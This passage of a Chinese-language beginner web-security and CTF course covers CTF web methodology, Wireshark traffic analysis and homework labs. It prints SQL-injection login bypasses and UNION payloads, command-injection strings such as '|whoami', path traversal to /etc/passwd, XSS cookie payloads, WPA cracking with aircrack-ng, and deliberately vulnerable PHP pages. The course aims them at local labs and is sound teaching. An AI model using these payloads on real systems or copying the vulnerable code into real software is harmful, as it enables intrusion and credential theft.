   - PHP在%00处截断，实际保存为shell.php
```

**防御方法：**
```
1. 白名单验证文件后缀（只允许jpg/png/gif等图片格式）
2. 重命名上传文件（随机文件名，用户无法控制文件名）
3. 文件内容检测（检测是否真的是图片，不能只看文件头）
4. 上传目录不给执行权限（最关键！上传目录设置为不可执行脚本）
5. 上传文件存放到独立域名（避免同源策略带来的Cookie问题）
6. 不要把上传目录暴露在Web可访问路径下
```

---

### 3.7 CTF Web题做题方法论（新手必看）

新手拿到一道CTF Web题往往不知道从哪下手，这里给出一个通用的做题流程：

```
第一步：访问题目页面，仔细观察
  - 查看页面源代码（右键→查看源代码），找注释、隐藏信息
  - F12打开开发者工具，看Console有没有报错信息
  - 看Network标签，看加载了哪些文件（CSS/JS/图片/接口）
  - 看有没有robots.txt、.git、.env等敏感文件
  - URL是什么形式？有没有参数？（如?id=1这种可能有SQL注入）
  - 有没有登录框？有没有注册功能？有没有上传点？
  - 页面有没有提示？（"Only admin can see flag"、"IP not allowed"等）

第二步：信息收集
  - 用目录扫描工具扫目录（dirsearch/gobuster）
  - 看Cookie和Session（F12→Application→Cookie）
  - 指纹识别（是什么语言/框架/CMS？）
  - 看JS文件（JS中可能有关键路径、API接口、密钥、逻辑）
  - 尝试访问常见路径：/admin、/phpinfo.php、/flag、/flag.txt等

第三步：漏洞测试
  根据页面功能点测试对应漏洞：
  - URL参数：测试SQL注入（加单引号、and 1=1/1=2）
  - 输入框：测试XSS（<script>alert(1)</script>）
  - 命令执行相关（ping、查询等）：测试命令拼接（|whoami、;id）
  - 文件上传：测试上传WebShell
  - 页面包含：测试文件包含（?file=../../etc/passwd）
  - 登录框：测试弱口令（admin/admin、admin/123456）、SQL万能密码
  - 参数比较：PHP弱类型（md5、strcmp、数组等）
  - 反序列化：unserialize()函数 → 反序列化漏洞

第四步：利用工具深入
  - Burp抓包看完整请求响应
  - 用Repeater反复调试payload
  - 用sqlmap测试SQL注入
  - 查看HTML源码/JS源码中的关键信息

第五步：拿flag
  - flag通常格式：flag{xxx}、flag{xx-xx-xx}、CTF{}等
  - 常见位置：
    - 直接在页面源码注释中
    - 数据库中
    - 服务器某个文件里（/flag、/etc/passwd等）
    - 环境变量中
    - Cookie里
    - HTTP响应头里
```

**CTF常用万能密码（SQL注入登录绕过）：**
```
用户名输入：admin' --
密码任意：

或者：
用户名：' or 1=1 --
密码：任意

或者：
用户名：admin'#
密码：

原理：把SQL查询变成永真条件，绕过密码验证。
例如原SQL：SELECT * FROM users WHERE username='admin' AND password='xxx'
注入后：SELECT * FROM users WHERE username='admin' --' AND password='xxx'
-- 后面的被注释掉了，只验证username='admin'是否存在。
```

**CTF常见flag位置（找不到flag时一个个试）：**
```
/flag
/flag.txt
/var/www/html/flag.php
/etc/passwd（有时flag写在注释中）
/proc/self/environ（环境变量）
页面源码注释中
数据库里
HTTP响应头中（X-Flag、Flag等header）
Cookie中
JS文件中
图片EXIF信息中
robots.txt中
```

---

## 四、Wireshark流量分析实操

### 4.1 Wireshark基础

Wireshark是最流行的网络抓包和协议分析工具，可以捕获网络数据包并逐层分析。在CTF的MISC方向和实际网络取证中非常重要。

### 4.2 抓取HTTP登录流量（获取明文密码）

实验步骤：
```
1. 打开Wireshark，双击选择正在使用的网卡（Wi-Fi或以太网）开始抓包

2. 设置捕获过滤器（可选，减少无关流量）：
   在开始抓包前，在"捕获过滤器"输入框输入 port 80，只抓80端口HTTP流量
   （如果不设置就抓所有流量，事后用显示过滤器过滤）

3. 开始抓包（点击蓝色鲨鱼鳍）

4. 在浏览器中访问一个HTTP网站并登录（HTTP是明文的，能看到密码）
   例如本地DVWA：http://127.0.0.1/DVWA/login.php
   输入用户名密码点击Login

5. 回到Wireshark，点击红色方块停止抓包

6. 设置显示过滤器：
   在顶部绿色过滤栏输入 http.request.method == "POST" 回车
   这样只显示POST请求（登录通常是POST）

7. 找到登录的POST请求（Info列有POST /DVWA/login.php）
   点击选中这个请求

8. 在下方"数据包详情"面板中展开各层：
   - Frame：帧信息（大小、时间）
   - Ethernet II：MAC地址
   - Internet Protocol：源IP和目标IP
   - Transmission Control Protocol：端口信息
   - Hypertext Transfer Protocol：HTTP协议（重点！）
     展开后可以看到：
     - 请求方法：POST
     - 请求URI：/DVWA/login.php
     - 各种请求头
     - 表单数据（HTML Form URL Encoded）：
       username = admin
       password = 123456       ← 明文密码！
       Login = Login
```

**追踪TCP流（查看完整HTTP请求和响应）：**
```
右键点击数据包 → 追踪流 → TCP流
弹出窗口中红色是客户端→服务器（请求），蓝色是服务器→客户端（响应）
可以看到完整的HTTP请求头、请求体、响应头、响应体
非常方便分析
```

### 4.3 Wireshark常用显示过滤器
```
====== 协议过滤 ======
http                    # 只显示HTTP
tls                     # HTTPS/TLS
tcp                     # TCP
udp                     # UDP
dns                     # DNS查询
icmp                    # Ping包
arp                     # ARP
ftp                     # FTP（明文密码）
smtp / pop3 / imap      # 邮件协议（可能明文）

====== IP过滤 ======
ip.addr == 192.168.1.1       # 和该IP通信的所有流量
ip.src == 192.168.1.1        # 源IP是xxx
ip.dst == 192.168.1.1        # 目标IP是xxx
ip.addr == 192.168.1.0/24    # C段

====== 端口过滤 ======
tcp.port == 80               # TCP 80端口
tcp.dstport == 80            # 目标端口80
tcp.srcport == 80            # 源端口80
udp.port == 53               # UDP 53（DNS）

====== HTTP特定过滤 ======
http.request.method == "POST"     # POST请求
http.request.method == "GET"      # GET请求
http.request.uri contains "login" # URI含login
http contains "password"          # 包中包含password字符串
http contains "flag"              # 包含flag
http.cookie contains "session"    # Cookie含session
http.response.code == 200         # 响应200

====== 组合过滤 ======
http && ip.addr == 192.168.1.1
tcp.port == 80 && !ip.addr == 192.168.1.100  # 排除某个IP
http or dns
not arp and not icmp               # 排除ARP和ICMP
```

### 4.4 Wireshark实用功能
```
1. 导出HTTP对象：文件 → 导出对象 → HTTP
   可以把HTTP传输中所有文件（图片、HTML、压缩包等）直接导出来

2. 流量统计：统计 → 对话（Conversations）
   查看哪些IP之间通信流量最大

3. 协议分级统计：统计 → 协议分级
   查看各协议占比

4. 追踪流：右键 → 追踪流 → TCP流/HTTP流
   查看完整会话内容

5. 查找包：Ctrl+F，选择"字符串"或"正则表达式"搜索包内容
```

### 4.5 CTF MISC流量分析常见题型

Wireshark在CTF MISC方向是高频考点，常见题型如下：

**题型1：HTTP中提取传输的文件（最基础最常见）**
```
场景：HTTP流量中上传或下载了文件（如压缩包、图片、文档），需要提取出来。

方法一：导出HTTP对象（最简单）
1. 文件 → 导出对象 → HTTP
2. 在弹出窗口中可以看到所有HTTP传输的文件列表
3. 按大小或类型排序，找到可疑文件（如.zip、.rar、.png、.jpg、.txt）
4. 选中文件点"Save"保存到本地
5. 如果是压缩包需要密码，可能密码在其他流量包中

方法二：追踪TCP流手动提取
1. 找到传输文件的那个TCP流（通常是POST上传或GET下载大文件）
2. 右键 → 追踪流 → TCP流
3. 选择"显示和保存数据为"：Raw（原始数据）
4. 注意区分请求和响应（红色是请求，蓝色是响应）
5. 找到文件数据部分，复制出来保存为文件
   - 如果文件在请求中：找红色部分（客户端→服务器）
   - 如果文件在响应中：找蓝色部分（服务器→客户端）
6. Save as保存为对应的文件后缀
```

**题型2：HTTP POST表单找密码/flag**
```
这是最简单的题型，通常在登录POST请求中：
1. 过滤器：http.request.method == "POST"
2. 逐个查看POST请求的表单数据
3. 找username/password参数，或直接搜索"flag"关键词
4. 也可以追踪TCP流查看完整请求
```

**题型3：FTP明文密码（FTP也是明文协议）**
```
FTP和HTTP一样是明文传输的，账号密码直接在包里：
1. 过滤器：ftp
2. 找USER命令（用户名）和PASS命令（密码）
3. FTP的数据传输端口是20，控制端口是21
4. 如果传输了文件，可以追踪TCP流提取
```

**题型4：WiFi流量（WPA/WPA2握手包破解）**
```
场景：抓到WiFi无线流量，需要破解WiFi密码。

解题步骤：
1. 过滤eapol协议（WPA握手包）：eapol
2. 如果能看到4个EAPOL包（4次握手），说明包含握手包
3. 用aircrack-ng爆破密码：
   aircrack-ng -w 字典.txt 抓包文件.pcap
4. 字典用常用弱口令字典（如rockyou.txt）
```

**题型5：USB流量分析（键盘/鼠标流量）**
```
场景：抓到USB设备的流量（如USB键盘输入），需要还原输入内容。

USB键盘数据格式（8字节）：
- 字节0：修饰键（Ctrl/Shift/Alt等）
- 字节1：保留
- 字节2-7：按下的键的HID码表

解题方法：
1. 过滤器：usb.capdata 或 usbhid.data
2. 提取每个包中的Leftover Capture Data（8字节数据）
3. 第3个字节（偏移2）是按键码，对照HID键盘码表还原字符
4. 可以写Python脚本自动提取转换

常用脚本思路：
- 读取pcap文件（用scapy库）
- 提取每个USB包的capdata
- 查表转成对应字符
- 输出还原的字符串
```

**题型6：压缩包密码在流量中**
```
场景：HTTP导出了加密的zip/rar压缩包，密码在其他流量中。

思路：
1. 仔细看所有HTTP请求，可能密码在GET/POST参数中
2. 看Cookie、Referer等请求头
3. 追踪TCP流看有没有聊天记录、密码提示
4. 搜索关键词：password、pass、pwd、key、密码、口令
5. 可能是弱密码，尝试爆破（用ARCHPR、fcrackzip等工具）
```

**题型7：HTTPS流量解密**
```
如果抓到HTTPS（TLS）流量但内容是加密的：
1. 如果能找到服务器的私钥（.key文件），可以配置Wireshark解密：
   编辑 → 首选项 → Protocols → TLS → RSA keys list → 添加私钥
2. 如果有SSLKEYLOGFILE（浏览器记录的TLS会话密钥）：
   编辑 → 首选项 → Protocols → TLS → (Pre)-Master-Secret log filename
   选择sslkey.log文件，即可解密TLS流量
```

### 4.6 流量分析例题

**例题：简单HTTP登录流量找密码**
```
题目：给一个test.pcap，里面包含一次HTTP登录请求，找出登录密码。

解题步骤：
1. Wireshark打开test.pcap
2. 显示过滤器输入：http.request.method == "POST" 回车
3. 看到有一条POST /login.php的请求
4. 点击选中该请求
5. 在下方详情面板展开 "Hypertext Transfer Protocol"
6. 展开 "HTML Form URL Encoded" 部分
7. 可以看到：
   username: admin
   password: P@ssw0rd123
   或者直接追踪TCP流看得更清楚
8. 密码就是 P@ssw0rd123
```

**例题：从流量中提取flag文件**
```
题目：test.pcap中有人通过HTTP下载了一个flag.txt文件，找出flag内容。

解题步骤：
方法一：导出HTTP对象
1. 文件 → 导出对象 → HTTP
2. 列表中找到flag.txt
3. 选中 → Save as保存
4. 打开保存的flag.txt即可看到flag

方法二：追踪TCP流
1. 过滤器：http.request.uri contains "flag.txt"
2. 找到对应的GET请求
3. 右键 → 追踪流 → TCP流
4. 蓝色部分（服务器响应）就是文件内容
5. 注意要去掉HTTP响应头，响应头和响应体之间有空行分隔
6. 响应体就是flag内容：flag{http_tr4ff1c_3xtr4ct_e4sy}
```

**Wireshark快捷键：**
```
Ctrl+E              开始/停止抓包
Ctrl+F              查找包
Ctrl+G              跳转到指定包号
Ctrl+M              标记/取消标记包
Shift+Ctrl+M        取消所有标记
Ctrl+.              下一个标记包
Ctrl+,              上一个标记包
→ / ←               在详情面板展开/折叠一层
*（小键盘）         展开/折叠当前子树
Enter               选中第一个包时展开/折叠详情
```

---

## 五、课后作业

### 作业1：环境搭建（必做）
```
1. 安装VMware Workstation
2. 下载Kali Linux VMware版OVA镜像导入
3. 配置Kali（4G内存/2核/NAT网络）
4. 启动Kali，更换国内源并更新系统
5. 安装open-vm-tools实现复制粘贴
6. 在Windows上安装PHPStudy，启动Apache+MySQL
7. 在WWW目录下创建info.php（<?php phpinfo();?>），浏览器访问测试
8. 安装Python3，配置清华pip源，pip install requests
9. 安装Burp Suite Community Edition
10. 配置浏览器代理（127.0.0.1:8080），安装Burp CA证书
11. 确认能在Burp的HTTP history中看到浏览器的HTTP/HTTPS流量
```

### 作业2：Burp Suite练习（必做）
```
1. 配置好Burp代理和证书后，访问几个HTTP和HTTPS网站
2. 在Proxy→HTTP history中查看请求记录
3. 开启Intercept拦截一个POST请求（比如登录表单），修改参数后Forward发送
4. 将一个请求Send to Repeater，修改参数Send几次，观察响应变化
5. 练习Decoder模块：分别对字符串做Base64编码/解码、URL编码/解码、MD5哈希
```

### 作业3：信息收集练习（必做）
```
目标：自己搭建的靶场或授权测试目标（⚠️ 不要对未授权网站扫描！）
1. 用ping获取目标IP
2. 用nmap -sV -sC -p 1-10000 扫描目标开放端口
3. 用Google/Bing/FOFA搜索目标信息
4. 用subfinder枚举子域名，用httpx验证存活
5. 用Wappalyzer和whatweb识别指纹
6. 先访问/robots.txt看有没有敏感路径
7. 用dirsearch扫描目录（-e php,txt,zip,bak）
8. 记录所有信息形成报告
```

### 作业4：PHP命令执行练习（必做）
```
1. 在PHPStudy的WWW目录下创建ping.php：
   <?php
   $ip = $_GET['ip'];
   system("ping -n 4 " . $ip);
   ?>
   注意：Windows下是ping -n 4，Linux是ping -c 4

2. 正常访问：http://localhost/ping.php?ip=127.0.0.1

3. 依次尝试以下payload，记录哪些成功执行了额外命令：
   ?ip=127.0.0.1|whoami
   ?ip=127.0.0.1%26whoami（注意&URL编码为%26）
   ?ip=127.0.0.1%26%26whoami（&&编码）
   ?ip=127.0.0.1||whoami（需要前面ping失败，传个不存在的IP试试）

4. 尝试空格绕过（自己先给ping.php加个过滤：把空格替换为空，再尝试绕过）：
   ${IFS}、$IFS$9、< 等

5. 搭建DVWA靶场，命令执行模块分别在Low/Medium/High难度测试
   Low：无过滤直接注入
   Medium：有简单过滤（如替换;和|），尝试绕过
   High：严格过滤，需要更巧妙的绕过方式
```

### 作业5：SQL注入练习（必做）
```
1. 在PHPStudy中创建测试数据库和表：
   打开phpMyAdmin（http://localhost/phpmyadmin），创建数据库test，
   执行以下SQL：
   CREATE TABLE users (
       id int AUTO_INCREMENT PRIMARY KEY,
       username varchar(50),
       password varchar(50)
   );
   INSERT INTO users (username,password) VALUES ('admin','admin123'),('test','test123');

2. 创建news.php模拟新闻页面：
   <?php
   $conn = mysql_connect('localhost','root','root'); // PHP5用mysql_，PHP7用mysqli_
   mysql_select_db('test',$conn);
   $id = $_GET['id'];
   $sql = "SELECT * FROM users WHERE id = $id";
   $result = mysql_query($sql);
   echo "SQL: ".$sql."<br>"; // 方便观察SQL语句
   while($row = mysql_fetch_assoc($result)){
       echo "id:".$row['id']." user:".$row['username']." pass:".$row['password']."<br>";
   }
   ?>

3. 正常访问：http://localhost/news.php?id=1
4. 测试注入：
   ?id=1'          # 看是否报错
   ?id=1 and 1=1   # 正常显示
   ?id=1 and 1=2   # 无数据
   ?id=1 order by 3  # 测试列数（如果users有3列，order by 3正常，4报错）
   ?id=-1 union select 1,2,3
   ?id=-1 union select 1,database(),version()
   ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
5. 搭建SQLi-labs靶场，完成Less-1到Less-5（基础UNION注入和布尔盲注）
```

### 作业6：PHP黑魔法练习（必做）
```
1. 在PHPStudy环境下创建test.php，验证所有弱比较：
   <?php
   var_dump("0e123" == "0e456");
   var_dump("abc" == 0);
   var_dump("1abc" == 1);
   var_dump(md5("240610708") == md5("QNKCDZO"));
   var_dump(strcmp([], "admin") == 0);
   var_dump(in_array("1abc", [0,1,2]));
   ?>
   浏览器访问查看每个var_dump的结果，记录哪些是true

2. 创建CTF题目md5.php：
   <?php
   $a = $_GET['a'] ?? "";
   $b = $_GET['b'] ?? "";
   if ($a != $b && md5($a) == md5($b)) {
       echo "Flag: {test_md5_flag}";
   } else {
       echo "失败";
   }
   ?>
   用两种方法（0e碰撞和数组绕过）获取flag

3. 创建strcmp.php：
   <?php
   if (isset($_GET['pwd'])) {
       if (strcmp($_GET['pwd'], "secret123") == 0) {
           echo "Flag: {test_strcmp_flag}";
       } else {
           echo "密码错误";
       }
   }
   ?>
   绕过获取flag
```

### 作业7：XSS练习
```
1. 创建反射型XSS测试页面xss.php：
   <?php
   $name = $_GET['name'] ?? "";
   echo "Hello, ".$name;
   ?>

2. 测试payload：
   ?name=<script>alert('XSS')</script>
   ?name=<script>alert(document.cookie)</script>
   ?name=<img src=x onerror=alert(1)>

3. 搭建DVWA靶场，完成XSS（Reflected）模块Low到High难度
4. 搭建Pikachu靶场，练习反射型XSS、存储型XSS、DOM型XSS
```

### 作业8：Wireshark练习（必做）
```
1. 安装Wireshark
2. 打开Wireshark选择网卡开始抓包
3. 过滤器设为http
4. 浏览器访问本地DVWA或其他HTTP站点，登录（可以用错误密码测试）
5. 停止抓包，找到POST请求
6. 追踪TCP流，找到提交的用户名和密码
7. 练习常用过滤器：http、ip.addr、tcp.port、http.request.method==POST
8. 去CTFHub或攻防世界下载一道简单的MISC流量分析题，提取flag
```

---

## 学习资源

### CTF练习平台
- CTFHub技能树：https://www.ctfhub.com （新手从这里开始）
- 攻防世界：https://adworld.xctf.org.cn
- BUUCTF：https://buuoj.cn
- Bugku：https://www.bugku.com
- TryHackMe：https://tryhackme.com （手把手教，强推）
- Hack The Box：https://www.hackthebox.com
- OverTheWire Bandit：http://overthewire.org/wargames/bandit/ （学Linux）
- PicoCTF：https://picoctf.org

### 靶场环境
- DVWA：http://www.dvwa.co.uk （最经典的入门靶场）
- Pikachu：https://github.com/zhuifengshaonianhanlu/pikachu （中文靶场）
- SQLi-labs：https://github.com/Audi-1/sqli-labs （SQL注入专项）
- Upload-labs：https://github.com/c0ny1/upload-labs （文件上传专项）
- XSS挑战：https://xss.haozi.me
- PortSwigger Web Security Academy：https://portswigger.net/web-security （免费且专业）

### 常用工具
- Burp Suite：https://portswigger.net/burp （Web安全必学工具）
- Nmap：https://nmap.org
- dirsearch：https://github.com/maurosoria/dirsearch
- subfinder：https://github.com/projectdiscovery/subfinder
- Wireshark：https://www.wireshark.org

### 学习社区
- 先知社区：https://xz.aliyun.com
- FreeBuf：https://www.freebuf.com
- 安全客：https://www.anquanke.com
- 看雪：https://bbs.kanxue.com （二进制/逆向方向）
- CTFtime：https://ctftime.org （国际CTF赛事日历）
